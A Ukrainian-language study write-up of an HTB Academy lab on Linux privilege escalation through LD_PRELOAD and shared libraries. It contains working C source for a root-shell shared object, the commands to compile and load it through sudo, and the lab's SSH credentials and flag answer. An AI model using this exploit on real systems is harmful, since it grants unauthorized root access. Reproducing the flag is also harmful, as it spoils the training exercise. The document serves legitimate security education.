# Shared Libraries

- [HTB Academy – Linux Privilege Escalation, Shared Libraries](https://academy.hackthebox.com/app/module/51/section/475)

### Тема уроку

Shared Libraries – Privilege Escalation через **LD_PRELOAD** у Linux.

### Ціль

- Розуміти різницю між static (`.a`) і shared (`.so`) бібліотеками.
- Знати, як процес знаходить і підвантажує динамічні бібліотеки.
- Вміти використати змінну середовища **LD_PRELOAD** для привілейованого виконання свого коду.
- Написати і скомпілювати просту `.so`, яка дає root-шелл при `sudo LD_PRELOAD=...`.
- Після прівеску знайти й здати флаг із `/root/ld_preload/flag.txt`.

***

## Питання

- Що таке static і shared бібліотеки в Linux, і як вони підключаються до програм? [medium](https://medium.com/@hemparekh1596/ld-preload-and-dynamic-library-hijacking-in-linux-237943abb8e0)
- Якими способами система дізнається, де шукати `.so`-файли (шляхи бібліотек)? [systemshardening](https://www.systemshardening.com/articles/linux/linux-shared-library-security/)
- Що робить змінна середовища **LD_PRELOAD** під час запуску програми?
- Як переглянути, які shared-бібліотеки використовує конкретний бінарник?
- Як перевірити, чи `sudo` зберігає `LD_PRELOAD` (через `env_keep`) і чи можна це використати для прівеску? [youtube](https://www.youtube.com/watch?v=-V9dHNsVIVk)
- Яким мінімальним C‑кодом можна отримати root-шелл через LD_PRELOAD?
- Які команди потрібні, щоб скомпілювати `.so` та скористатися `sudo LD_PRELOAD=...`?
- Де саме лежить флаг у цьому завданні Academy і як його прочитати?

***

## Відповіді / Конспект

### 1. Static vs shared бібліотеки

- **Static (`.a`)**:
  - Під час компіляції код бібліотеки просто «вшивається» в фінальний бінарник.
  - Після компіляції бібліотеку змінити не можна – змінюється тільки сам бінарник. [medium](https://medium.com/@hemparekh1596/ld-preload-and-dynamic-library-hijacking-in-linux-237943abb8e0)
- **Shared (`.so`)**:
  - Підвантажуються динамічно під час виконання програми через динамічний лінкер.
  - Можна замінити `.so` або підкинути свій варіант, щоб змінити поведінку програм, які її викликають. [wiz](https://www.wiz.io/blog/linux-rootkits-explained-part-1-dynamic-linker-hijacking)

### 2. Як система знаходить `.so` (шляхи бібліотек)

Шляхи для пошуку бібліотек можуть задаватися: [systemshardening](https://www.systemshardening.com/articles/linux/linux-shared-library-security/)

- **При компіляції**:
  - `-rpath` і `-rpath-link` – вбудовують у бінарник шлях, де шукати бібліотеки.
- **Змінні середовища**:
  - `LD_RUN_PATH` – шлях для runtime-лінкування.
  - `LD_LIBRARY_PATH` – список директорій, де шукати `.so`.
- **Системні директорії**:
  - `/lib`, `/usr/lib` – дефолт.
- **Конфігурація динамічного лінкера**:
  - `/etc/ld.so.conf` – додаткові директорії для `ld.so`.

Головна ідея: якщо ти контролюєш один із цих шляхів, можеш вплинути на те, яку бібліотеку програма реально завантажить. [wiz](https://www.wiz.io/blog/linux-rootkits-explained-part-1-dynamic-linker-hijacking)

### 3. LD_PRELOAD: що це робить

- **`LD_PRELOAD`** – змінна середовища, яка говорить динамічному лінкеру: «перед усіма іншими бібліотеками завантаж ось це». [hackingarticles](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)
- Функції (символи) з бібліотеки, що підвантажується через `LD_PRELOAD`, **мають пріоритет** над такими ж функціями з інших `.so`.
- Якщо `sudo` дозволяє зберегти `LD_PRELOAD` (через `env_keep+=LD_PRELOAD` у `/etc/sudoers`), ти можеш змусити root‑процес завантажити свою бібліотеку. [youtube](https://www.youtube.com/watch?v=-V9dHNsVIVk)

### 4. Перегляд бібліотек, які використовує бінарник (ldd)

Команда з уроку: [medium](https://medium.com/@hemparekh1596/ld-preload-and-dynamic-library-hijacking-in-linux-237943abb8e0)

```bash
ldd /bin/ls
```

Вивід показує всі потрібні бібліотеки:

```text
linux-vdso.so.1 =>  (0x...)
libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1
libc.so.6       => /lib/x86_64-linux-gnu/libc.so.6
libpcre.so.3    => /lib/x86_64-linux-gnu/libpcre.so.3
libdl.so.2      => /lib/x86_64-linux-gnu/libdl.so.2
/lib64/ld-linux-x86-64.so.2
libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0
```

- Так можна зрозуміти, що саме буде підвантажено і де лежать `.so`. [medium](https://medium.com/@hemparekh1596/ld-preload-and-dynamic-library-hijacking-in-linux-237943abb8e0)

### 5. Перевірка sudo і LD_PRELOAD

Команда: [hackingarticles](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)

```bash
sudo -l
```

У прикладі:

```text
Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=...
    env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

Важливі моменти:

- `env_keep+=LD_PRELOAD` – змінна середовища **зберігається** при виклику `sudo` (не чиститься).
- `NOPASSWD` – можна запускати команду без пароля.
- Команда, яку можна виконати як root: `/usr/sbin/apache2 restart`.

Хоча `apache2 restart` сам по собі не GTFOBins, ми змушуємо root‑процес **перед виконанням** підвантажити наш `.so` через `LD_PRELOAD`. [youtube](https://www.youtube.com/watch?v=-V9dHNsVIVk)

### 6. Малий експлойт-бібліотека (root.so)

Код із уроку: [intrusionz3r0.gitbook](https://intrusionz3r0.gitbook.io/intrusionz3r0/linux-penetration-testing/privilege-escalation/shared-libraries)

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Розбір:

- `void _init()` – спеціальна функція, яка викликається **автоматично** при завантаженні бібліотеки.
- `unsetenv("LD_PRELOAD")` – прибирає змінну, щоб не зациклити себе.
- `setgid(0); setuid(0);` – виставляє GID/UID на root (0).
- `system("/bin/bash");` – запускає bash з привілеями root.

Якщо це завантажить процес `sudo`/`apache2` як root, твій `bash` буде root‑shell. [wiz](https://www.wiz.io/blog/linux-rootkits-explained-part-1-dynamic-linker-hijacking)

### 7. Компіляція бібліотеки

Команда з уроку:

```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

- `-fPIC` – Position Independent Code (необхідно для `.so`).
- `-shared` – зібрати як shared library.
- `-o root.so` – вихідний файл – `root.so`.
- `-nostartfiles` – не лінкити стандартні стартові файли (треба тільки наша `_init`). [intrusionz3r0.gitbook](https://intrusionz3r0.gitbook.io/intrusionz3r0/linux-penetration-testing/privilege-escalation/shared-libraries)

### 8. Прівеск через sudo + LD_PRELOAD

Ключова команда:

```bash
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

- `LD_PRELOAD=/tmp/root.so` – кажемо `sudo` (який зберігає цю змінну), щоб root-процес завантажив нашу бібліотеку.
- `/usr/sbin/apache2 restart` – команда, яку `sudo` дозволяє виконувати без пароля.

Після виконання:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

Маємо root‑shell. [hackingarticles](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)

***

## Q1 – Flag із /root/ld_preload

У завданні:

> Escalate privileges using LD_PRELOAD technique. Submit the contents of the flag.txt file in the /root/ld_preload directory.  
> SSH: `htb-student / Academy_LLPE!`

Після успішного прівеску:

```bash
root@NIX02:~# cd /root/ld_preload
root@NIX02:/root/ld_preload# ls
flag.txt
root@NIX02:/root/ld_preload# cat flag.txt
6a9c151a599135618b8f09adc78ab5f1
```

Тож відповідь:

> `6a9c151a599135618b8f09adc78ab5f1` [intrusionz3r0.gitbook](https://intrusionz3r0.gitbook.io/intrusionz3r0/linux-penetration-testing/privilege-escalation/shared-libraries)
